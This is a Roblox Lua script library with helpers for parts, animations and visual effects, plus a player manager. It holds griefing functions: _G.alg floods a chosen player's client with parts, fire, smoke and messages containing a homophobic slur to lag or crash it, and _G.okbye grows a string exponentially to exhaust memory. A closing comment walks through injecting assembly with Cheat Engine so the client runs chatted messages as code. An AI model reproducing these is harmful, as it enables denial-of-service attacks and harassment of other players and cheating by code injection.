-- run this first
game:service'Debris':AddItem(script,0)
--script:ClearAllChildren()
-- ­   31398059
SavedFenvs = {}
for i,v in pairs(getfenv()) do 
SavedFenvs[i]=true
end
-- c/while wait() do for i=1,200 do Instance.new("Message",game.Players.Damply.PlayerGui).Text="yes" end end 
 
ins = Instance.new
v3 = Vector3.new
cn = CFrame.new
ca2 = CFrame.Angles
mf = math.floor
mran = math.random
mrad = math.rad
mdeg = math.deg
ca = function(x,y,z) return ca2(mrad(x),mrad(y),mrad(z)) end 
ud=UDim2.new
bn = BrickColor.new
c3 = Color3.new
 
Players = game:service'Players'
Lighting = game:service'Lighting'
Debris = game:service'Debris'
 
Lastqi={} 
qit = {} 
qit["n"]="Name" 
qit["sc"]="Size" 
qit["cf"]="CFrame"
qit["an"]="Anchored"
qit["can"]="CanCollide"
qit["mat"]="Material"
qit["bn"]="BrickColor"
qit["mid"]="MeshId"
qit["tid"]="TextureId"
qit["sca"]="Scale"
qit["tra"]="Transparency"
qit["ref"]="Reflectance"
qit["mtyp"]="MeshType"
qit["P0"]="Part0"
qit["P1"]="Part1"
qit[""]=""
qit[""]=""
qit["tya"]="TextYAlignment"
qit["txa"]="TextXAlignment"
qit["bc3"]="BackgroundColor3"
qit["tc3"]="TextColor3"
qit["pos"]="Position"
qit["txt"]="Text"
qit["bgt"]="BackgroundTransparency"
qit["txs"]="TextTransparency"
qit["tst"]="TextStrokeTransparency"
qit["tsc3"]="TextStrokeColor3"
qit[""]=""
qit[""]=""
qit[""]=""
 
 
C3Pro={}
C3Pro['BackgroundColor3']=0
C3Pro['TextColor3']=0
C3Pro['TextStrokeColor3']=0
C3Pro['Color']=0
C3Pro['BackgroundColor3']=0
C3Pro['BackgroundColor3']=0
C3Pro['BackgroundColor3']=0
 
BNPro={}
BNPro['BrickColor']=0
 
 
GuiClass={}
GuiClass["Frame"]=0
GuiClass["TextLabel"]=0
GuiClass["TextButton"]=0
GuiClass["TextBox"]=0
GuiClass["ImageLabel"]=0
GuiClass["ImageButton"]=0
qi = function(tab)
local v = ins(tab[1])
--
if v:IsA("Part") or v:IsA("WedgePart") then v.formFactor="Custom" end
if v:IsA("BasePart") then v.TopSurface=0 v.BottomSurface=0 v.Locked=true end
if GuiClass[v.className] then v.BorderSizePixel=0 end 
--
for index,element in pairs(tab) do 
if index~=1 and index~=2 then 
local index = qit[index] or index
--
if C3Pro[index] and type(element)=='string' then element=bn(element).Color end
if BNPro[index] and type(element)=='string' then element=bn(element) end
--
if index=='Debris' then
Debris:AddItem(v,element)
else
v[index]=element
end
end
end
if type(tab[2])=='number' then v.Parent=Lastqi[#Lastqi-tab[2]] elseif tab[2] then v.Parent=tab[2] end
Lastqi[#Lastqi+1]=v
if v:IsA("BasePart") then v:BreakJoints() end 
return v
end
 
iform=function(tab)
for i,v in pairs(tab) do tab[v]=v end
return tab 
end
 
SetLocalPlayer = [==[
Player=Players.LocalPlayer
Char=Player.Character
if Char:findFirstChild("Head") or Char:findFirstChild("Torso") then else error'Player/CantFindParts' end
Head=Char.Head
Torso=Char.Torso
Hum=Char.Humanoid
Backpack=Player.Backpack
PlayerGui=Player.PlayerGui
]==]
 
q = function(f) -- quick function
coroutine.resume(coroutine.create(function() f() end))
end 
 
--- the pw is my last name -2 letters + my 2012 school student id
 
PlayerManager={}
PM=PlayerManager
pm=PM
PM.Load = function(ta,st)
local Pv
local count=0
for i,v in pairs(Players:GetPlayers()) do if string.find(v.Name:lower(),st:lower()) and count==0 then Pv=v count=count+1 end end
if not Pv or count>1 then return {} end 
local PStat={Name=Pv.Name,Age=Pv.AccountAge,v=Pv}
if Pv.Character and Pv.Character:findFirstChild'Torso' then PStat.Torso=Pv.Character.Torso end 
if Pv.Character and Pv.Character:findFirstChild'Humanoid' then PStat.H=Pv.Character.Humanoid end 
PStat.Kill = function() if Pv.Character then Pv.Character:BreakJoints() end end 
PStat.asd = function() if Pv.Character and Pv.Character:findFirstChild'Torso' and Pv.Character:findFirstChild'Humanoid' then 
Pv.Character.Humanoid.Sit=true Pv.Character.Torso.CFrame=Pv.Character.Torso.CFrame*ca(45,0,0) Pv.Character.Torso.Velocity=Pv.Character.Torso.CFrame.lookVector*100 end  end
PStat.r=function() Pv:LoadCharacter() end 
PStat.Char=function() return Pv.Character end 
PStat.load=function() return Pv,Pv.Character,Pv.Backpack,Pv:findFirstChild'PlayerGui' end
PStat.gca=function(t,naa) local Pv2=pm:l(naa).v if Pv2 then Pv.CharacterAppearance=Pv2.CharacterAppearance end end
return PStat
end
PM.l=PM.Load
--c/PlayerManager:Load'drew':asd()
--c/_G.br = function() _G.brr = _G.brr and _G.brr:Remove() _G.brr = qi{'Part',workspace,an=true,FrontSurface='Hinge',cf=cn(0,6,0)} return _G.brr end 
 
Welds={}
Ani=function(w,a,b,c,d,e,f,ty,inc,sined)
if not Welds[w] then
local d0,e0,f0=w.C0:toEulerAnglesXYZ() local d1,e1,f1=w.C1:toEulerAnglesXYZ()
local d0,e0,f0=mdeg(d0),mdeg(e0),mdeg(f0) local d1,e1,f1=mdeg(d1),mdeg(e1),mdeg(f1)
Welds[w]={[0]={w.C0.x,w.C0.y,w.C0.z,d0,e0,f0},[1]={w.C1.x,w.C1.y,w.C1.z,d1,e1,f1}}
end
local c0,c1=Welds[w][0],Welds[w][1]
c0[1],c0[2],c0[3]=w.C0.x,w.C0.y,w.C0.z
c1[1],c1[2],c1[3]=w.C1.x,w.C1.y,w.C1.z
local A0,B0,C0,D0,E0,F0 = unpack(c0)
local A1,B1,C1,D1,E1,F1 = unpack(c1)
local Do = function(i)
if ty==0 then
w.C0=cn( A0-((A0-a)*i) , B0-((B0-b)*i) , C0-((C0-c)*i) ) * ca( D0-((D0-d)*i) , E0-(((E0-e)/1)*i) , F0-((F0-f)*i) )
elseif ty==1 then
w.C1=cn( A1-((A1-a)*i) , B1-((B1-b)*i) , C1-((C1-c)*i) ) * ca( D1-((D1-d)*i) , E1-(((E1-e)/1)*i) , F1-((F1-f)*i) )
else
w.C0=cn( A0-((A0-a)*i) , B0-((B0-b)*i) , C0-((C0-c)*i) ) * ca(D0,E0,F0)
w.C1=cn(A1,B1,C1) * ca( D1-((D1-d)*i) , E1-(((E1-e)/1)*i) , F1-((F1-f)*i) )
end
end
for i=inc,1,inc do 
Do(sined and math.sin(math.pi/2*i) or i)
wait()
end
Do(1)
if ty==0 then
c0[4],c0[5],c0[6]=d,e,f 
else
c1[4],c1[5],c1[6]=d,e,f 
end
end
qAni=function(w,a,b,c,d,e,f,ty,inc,sined) q(function() Ani(w,a,b,c,d,e,f,ty,inc,sined) end) end
rAni=function(w)
Welds[w]=nil
end
--script/Ani(workspace.RobroxMasterDX.Torso["Left Shoulder"],-1.5,0.5,0,0,-90,0,0,0.1,true)
--script/Ani(workspace.RobroxMasterDX.Torso["Left Shoulder"],0,0.5,0,0,-90,0,1,0.1)
--  [ ]
 
Sound = function(id,par,vol,pit) 
q(function() -- Sound maker
 local sou = qi({"Sound",par or workspace,Volume=vol or 1,Pitch=pit or 1,SoundId=id,Debris=4})
 wait() sou:play() 
end) 
end
 
Dmg = function(Hum,Dealt,Hitter)
local HM=Hum.Parent
local HMT,HMB=HM:findFirstChild'Torso',HM:findFirstChild'Block'
local Blocks=HMB and HMB.Value>0
if HMT then
local mm=qi{'Model',HMT,Debris=1} qi{'Humanoid',mm,MaxHealth=0} 
local mp= qi{'Part',mm,n='Head',an=true,can=false,sc=v3(1,0.2,1),cf=HMT.CFrame*cn(mran(-100,100)/50,3,mran(-100,100)/50)} qi{'SpecialMesh',mp}
if Blocks then 
mm.Name='Block!'
mp.BrickColor=bn'Bright blue'
HMB.Value=HMB.Value-1
else
mm.Name=Dealt
mp.BrickColor=bn'Bright red'
end
end
if not Blocks then  
Hum.Health=Hum.Health-Dealt
end
end
 
GetHum = function(part)
local Hum,HT,block
for i,v in pairs(part.Parent:children()) do 
if v:IsA("Humanoid") then
Hum=v
elseif v.Name=='Torso' then
HT=v
elseif v.Name=='Block' and v:IsA("NumberValue") then
block=v
end
end
return Hum,HT,block
end
 
ray = function(Pos, Dir,tab) -- ray cast
return workspace:FindPartOnRay(Ray.new(Pos, Dir.unit *999),tab) 
end 
 
raydist=function(Pos,Dir,tab)
local hit,pos=ray(Pos,Dir,tab)
return (Pos-pos).magnitude
end
 
RangeAnim=function(obj,sticks,times,speed,range,fu,ignor,isanc,nobreak,dohit)
local isanc = isanc or false
local sts = {}
local Hit,Pos
for i,v in pairs(sticks) do 
sts[v]=v.CFrame:toObjectSpace(obj.CFrame)
end
for ty=1,times do 
if not obj.Parent then return end 
obj.CFrame=obj.CFrame*cn(0,0,-speed)
for i,v in pairs(sts) do i.CFrame=obj.CFrame*v end
local hit,pos=ray(obj.Position,obj.Position-obj.CFrame*cn(0,0,1).p,ignor)
Pos=pos
fu(ty,obj,hit,pos)
if hit and dohit then dohit(hit) end
if (hit and hit.Name~='unray') and (pos-obj.Position).magnitude<range then if not isanc or (hit.Anchored and hit.Transparency<1) then Hit=hit if not nobreak then break end end end 
wait()
end
return Hit,(Pos-obj.Position).magnitude,Pos
end
 
 
GetRegion = function(pos,ra,f,f2) -- range get 
 local p0,p1=pos-v3(ra/2,ra/2,ra/2),pos+v3(ra/2,ra/2,ra/2)
 q(function()
 for i,v in pairs(workspace:FindPartsInRegion3(Region3.new(p0,p1),nil,100))  do 
 local Hum=GetHum(v)
 if v.Name=='Torso' and Hum and Hum.Health>0  then 
 q(function()  f(Hum,v)  end) 
 elseif f2 and not Hum then 
 q(function()  f2(v)  end) 
 end 
 end
 end) 
end 
 
AddBV=function(str,cfr,par,deb)
if not par or not str then return end 
if par:findFirstChild'LibBV' then par.LibBV:Remove() end 
qi{'BodyVelocity',par,velocity=cfr.lookVector*str,maxForce=v3(1,1,1)*50000,Debris=deb,n='LibBV'}
end
AddBG=function(str,par,deb)
if not par then return end 
if par:findFirstChild'LibBG' then par.LibBG:Remove() end 
qi{'BodyGyro',par,maxTorque=v3(1/0,1/0,1/0),P=100000,cframe=str,Debris=deb,n='LibBG'}
end
 
Trails={}
Trail=function(obj,th,color,inc,wt,adj)
local adj=adj or cn(0,0,0)
Trails[obj]=1
q(function()
local lastpos=(obj.CFrame*adj).p
while Trails[obj] do wait(wt)
local newpos=(obj.CFrame*adj).p
local mag=(newpos-lastpos).magnitude
local trp=qi{'Part',obj,sc=v3(0.2,0.2,0.2),an=true,can=false,bn=bn(color),cf=cn(lastpos,newpos)*cn(0,0,-mag/2)*ca(90,0,0)} 
local trpm=qi{'SpecialMesh',trp,sca=v3(th,mag,th)*5}
local trpms=trpm.Scale
lastpos=newpos
q(function()
for i=1,0,-inc do 
trp.Transparency=0.3+(0.7*(1-i))
trpm.Scale=v3(th*5*i,mag*5,th*5*i)
wait()
end
trp:Remove()
end)
end
end)
end
--c/Trail(workspace.RobroxMasterDX.Torso,0.5,'Black',0.1,0.1)
 
MeshEffect=function(par,cf,x,y,z,inc,col,sha,adj)
local adj = adj or cn(0,0,0)
local mp=qi{'Part',par,sc=v3(1,1,1),bn=bn(col),cf=cf,tra=0.3,can=false,an=true,n='unray'}
local ms
if sha:sub(1,4)=='http' then
ms=qi{'SpecialMesh',mp,mid=sha}
elseif sha=='Block' then
ms=qi{'BlockMesh',mp}
elseif sha=='Cylinder' then
ms=qi{'CylinderMesh',mp}
elseif sha=='Head' or sha=='Sphere' then
ms=qi{'SpecialMesh',mp,MeshType=sha}
end
q(function()
for i=0,1,inc do 
mp.Transparency=0.2+(0.7*i)
mp.CFrame=mp.CFrame*adj
ms.Scale=v3(x,y,z)*(0.3+(0.7*i))
wait(0.03)
end
mp:Remove()
end)
end
 
Lightning = function(par,p0,p1,tym,th,col,inc,spr)
local bricks={}
local cur={} 
local mag=(p0-p1).magnitude
for i=1,tym,1 do 
cur[i]=cn(p0,p1)*cn(0,0,-mag/tym*i).p+v3(mran(-spr,spr),mran(-spr,spr),mran(-spr,spr))
end
cur[0]=p0
cur[tym]=p1
for i=1,tym do 
local mag2=(cur[i-1]-cur[i]).magnitude
bricks[i]=qi{'Part',par,sc=v3(0.2,0.2,0.2),an=true,can=false,bn=bn(col),cf=cn(cur[i-1],cur[i])*cn(0,0,-mag2/2)*ca(90,0,0),tra=0.3,ref=0.15} qi{'BlockMesh',bricks[i],sca=v3(th,mag2,th)*5}
end
q(function()
for i=0,1,inc do 
for x,v in pairs(bricks) do v.Transparency=0.3+(0.7*i) end 
wait()
end
for i,v in pairs(bricks) do v:Remove() end 
end)
end
 
Reconnect=function()
game:service'TeleportService':Teleport(game.PlaceId)
end
 
 
--Set a Table of my variables
LVars = {}
for i,v in pairs(getfenv()) do 
if not SavedFenvs[i] then
LVars[i]=v
end
end
_G.LVars = LVars
 
for i,v in pairs(LVars) do _G[i]=v  end 
 
 
-- loadstring
hazemlaib = [==[
for i,v in pairs(_G.LVars) do 
getfenv()[i]=v
end
]==]
 
_G['R'..'M'..'L'..'ib']=hazemlaib
 
_G.okbye=function()
local ded=Instance.new("StringValue",workspace)
for i=1,10000 do 
ded.Value = ded.Value .."lolllllllllllllllll".. ded.Value 
wait(0.03)
end
end
_G.alg=function(nn,msg)
local pp=pm:l(nn).v if not pp then return end
for i=1,75 do newLocalScript([[game.Players.LocalPlayer.CameraMode=1 for i=1,100 do coroutine.resume(coroutine.create(function() while wait() do for i=1,200 do local lal=Instance.new("Part",workspace.Camera) lal.Size=Vector3.new(200,200,200) Instance.new("Fire",lal).Size=100 Instance.new("Smoke",lal).Size=3000 Instance.new("Message",workspace).Text='lefaglol' Instance.new("Hint",workspace).Text='lefaglol' end end end)) end]],pp.Character) end
print('lagging'..pp.Parent.Name)
local pp=pp:findFirstChild'PlayerGui' if not pp then return end while wait() do 
for i=1,32 do 
q(function()
for i=1,16 do 
q(function()
for i=1,8 do 
q(function()
while wait() do for i=1,100 do Instance.new("Message",pp).Text=msg or 'Dont mess with me Fa­ggot.' end end
end)
end
end)
end
end)
end
--
end
end
_G.alc=function(nn)
pcall(function() qi{'Message',workspace,Debris=4,Text=#game:service'Players'[nn].PlayerGui:children()} end)
end
 
 
q(function()
if Players.LocalPlayer==nil then
for i,v in pairs(script:children()) do 
if v:IsA("StringValue") then 
for i,p in pairs(Players:GetPlayers()) do
q(function() newLocalScript(v.Value,p.Character) end)
end
end
end
end
end)
--script/loadstring(_G.RMLib)() print(ins)
print('libbaload')
 
--[[
 
repeat wait() until game:service'Players'.LocalPlayer
game:service'Players'.LocalPlayer.Chatted:connect(function(msg) Spawn(loadstring(msg)) end)
 
 
1. studio
2. ce 
3. attach and mem view
4. tools> auto assem
5. 
alloc(newmem,2048) //2kb should be enough
alloc(hax,2048)
label(returnhere)
label(originalcode)
label(exit)
 
hax:
db 72 65 70 65 61 74 20 77 61 69 74 28 29 20 75 6e 74 69 6c 20 67 61 6d 65 3a 73 65 72 76 69 63 65 27 50 6c 61 79 65 72 73 27 2e 4c 6f 63 61 6c 50 6c 61 79 65 72 0d 0a 67 61 6d 65 3a 73 65 72 76 69 63 65 27 50 6c 61 79 65 72 73 27 2e 4c 6f 63 61 6c 50 6c 61 79 65 72 2e 43 68 61 74 74 65 64 3a 63 6f 6e 6e 65 63 74 28 66 75 6e 63 74 69 6f 6e 28 6d 73 67 29 20 53 70 61 77 6e 28 6c 6f 61 64 73 74 72 69 6e 67 28 6d 73 67 29 29 20 65 6e 64 29
 
newmem: //this is allocated memory, you have read,write,execute access
//place your code here
 
originalcode:
call 006B7670
push b99e7c
push hax
push 07
mov ecx,esi
call 6b7670
 
exit:
jmp returnhere
 
006E156D:
jmp newmem
returnhere:
 
6. new place, command bar: Game:service'TeleportService':TeleportImpl(20279777,"")
 
]]
 